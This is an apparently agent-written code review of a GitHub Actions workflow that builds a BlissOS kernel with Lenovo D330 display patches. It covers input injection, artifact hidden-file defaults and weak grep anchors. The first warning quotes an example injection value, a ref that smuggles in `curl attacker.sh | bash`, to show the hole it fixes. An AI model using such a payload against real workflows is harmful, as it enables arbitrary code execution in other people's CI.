---
phase: 57-blissos-ci-kernel-build-kernel-common-glk-ccs-patches
reviewed: 2026-10-19T23:59:00Z
depth: standard
files_reviewed: 6
files_reviewed_list:
  - .github/workflows/build-blissos-kernel.yml
  - patches/android/d330_android_x86_6.6.patch
  - patches/android/d330_android_glk_reset_fix_6.6.patch
  - patches/android/README.md
  - .github/workflows/build-kernel.yml
  - .planning/phases/57-blissos-ci-kernel-build-kernel-common-glk-ccs-patches/57-CONTEXT.md
findings:
  critical: 0
  warning: 2
  info: 2
  total: 4
status: findings
fixes_applied:
  fixed: 3
  skipped: 0
  remaining_info: 1
  note: WR-01, WR-02, IN-01 fixed (uncommitted, deferred-commit mode); IN-02 advisory only
---

# Phase 57: Code Review Report

**Reviewed:** 2026-10-19T23:59:00Z
**Depth:** standard
**Files Reviewed:** 6
**Status:** findings

**Fix pass (2026-10-19):** WR-01 (env-indirect `ref`), WR-02 (`include-hidden-files: true`), and IN-01 (added-only grep anchors `quirk_lenovo_d330_pps` / `glk_fixup_mipi_sequences`, both verified present as `+`-added lines in the patches) applied to `.github/workflows/build-blissos-kernel.yml`. IN-02 remains informational. Changes left uncommitted per deferred-commit mode.

## Summary

Reviewed the new dispatch-only BlissOS kernel workflow, the adapted CCS patch, the GLK patch, and the README against the locked phase decisions and the proven `build-kernel.yml` pattern. Verified: gate ordering (both `git apply --check`s before either apply, gate step before configure/build, upload only on default `success()` so no artifact on red); CCS-then-GLK ordering safe (zero file overlap between the two patches); all CCS hunk header counts re-derived from the hunk bodies and arithmetically consistent (the 57-01 header-recount claim holds); grep anchors all exist in the patches; artifact paths match real build outputs (`arch/x86/boot/bzImage`, tree-root `System.map`); SHA256SUMS generated in the artifact root from bare filenames so `sha256sum -c` works after extraction; `permissions: contents: read` minimal, no secrets, dispatch-only trigger, README dispatch command matches the `ref` input exactly. Two warnings: shell interpolation of the `ref` input, and `.config` likely dropped from the artifact by upload-artifact's hidden-file default.

## Warnings

### WR-01: `inputs.ref` interpolated directly into shell — script injection surface

**Status:** fixed — input now passed via `env: REF` and consumed as `"$REF"` in the clone step.

**File:** `.github/workflows/build-blissos-kernel.yml:55`
**Issue:** `git clone --depth 1 --branch "${{ inputs.ref }}"` splices the workflow_dispatch input directly into a `run:` script. Anyone with dispatch rights can pass a value like `hm/crimson" ; curl attacker.sh | bash #` and execute arbitrary commands in the job. Dispatch requires write access so the blast radius is "repo collaborators attacking their own CI", but this is the standard Actions expression-injection anti-pattern and the repo otherwise practices minimal-permissions hygiene.
**Fix:** pass the input through `env` and reference the shell variable:
```yaml
      - name: Fetch kernel source
        env:
          REF: ${{ inputs.ref }}
        run: |
          set -euxo pipefail
          BUILD="$RUNNER_TEMP/kbuild"
          git clone --depth 1 --branch "$REF" \
            https://github.com/android-generic/kernel_common.git \
            "$BUILD/kernel_common"
```

### WR-02: `.config` will likely be silently dropped from the artifact (hidden-file default); SHA256SUMS then fails `sha256sum -c`

**Status:** fixed — `include-hidden-files: true` added to the upload-artifact step.

**File:** `.github/workflows/build-blissos-kernel.yml:108-116`
**Issue:** Since `actions/upload-artifact` v4.4.0, hidden files (dotfiles) are excluded unless `include-hidden-files: true` is set — the default is `false`, and the exclusion applies to the file collection regardless of explicit path listing. `.config` is a dotfile, so the artifact will most likely contain only `bzImage`, `System.map`, `SHA256SUMS` — contradicting the README's documented contents ("`bzImage`, `System.map`, `.config`, and `SHA256SUMS`", patches/android/README.md:112-113) and breaking integrity verification, because `SHA256SUMS` (line 106) includes a `.config` hash entry and `sha256sum -c SHA256SUMS` exits nonzero on the missing file. `upload-artifact` does not error when *some* globs match, so this fails silently. (Cannot confirm v7's default from this checkout; if v7 changed the default the finding is moot — but the cheap fix is correct either way.)
**Fix:** add `include-hidden-files: true` to the upload step, or copy `.config` to a non-hidden name before hashing/uploading, e.g. `cp .config config` and hash/upload `config` — the latter also keeps consumer-side `sha256sum -c` working regardless of artifact-action defaults.

## Info

### IN-01: Two grep anchors are weak — they match pre-existing upstream code, not just the patch's added lines

**Status:** fixed — anchors replaced with `quirk_lenovo_d330_pps` (intel_quirks.c) and `glk_fixup_mipi_sequences` (intel_bios.c), both verified as added-only `+` lines in the patches.

**File:** `.github/workflows/build-blissos-kernel.yml:77,80`
**Issue:** `intel_fb_is_ccs_modifier` in `skl_universal_plane.c` and `IS_GEMINILAKE` in `intel_bios.c` exist in upstream 6.6 sources independent of these patches (the CCS/rotation check and GLK branches predate them), so those two anchors would pass even if the patches had not landed. The gate is not weakened overall — `dmi_match(DMI_PRODUCT_NAME, "82H0")` and the `Running INIT_OTP (GPIO/delay only) as DEASSERT_RESET` string are added-only and do prove each patch landed — but two of the five anchors give false assurance.
**Fix:** anchor on added-only strings, e.g. `quirk_lenovo_d330_pps` (intel_quirks.c) and `glk_fixup_mipi_sequences` (intel_bios.c), matching how `build-kernel.yml:165-166` anchors its GLK fixup.

### IN-02: Workflow has never run end-to-end — only the patch gate has a local predictor

**File:** `.github/workflows/build-blissos-kernel.yml` (whole file)
**Issue:** Phase 57 verification proves the gate sequence locally against crimson tip `447ff151`; the build/configure/upload steps are shape-verified only (per 57-02-SUMMARY). First dispatch is the real test — possible first-run surprises include android `kernel_common`'s `x86_64_defconfig` behaving differently than mainline expectations, and the WR-02 artifact question resolving one way or the other. This is acknowledged in the phase summary (user-dispatched verification), so informational.
**Fix:** none required; on first dispatch, verify the artifact listing contains all four documented files and that `sha256sum -c SHA256SUMS` passes post-download.

---

_Reviewed: 2026-10-19T23:59:00Z_
_Reviewer: the agent (gsd-code-reviewer)_
_Depth: standard_
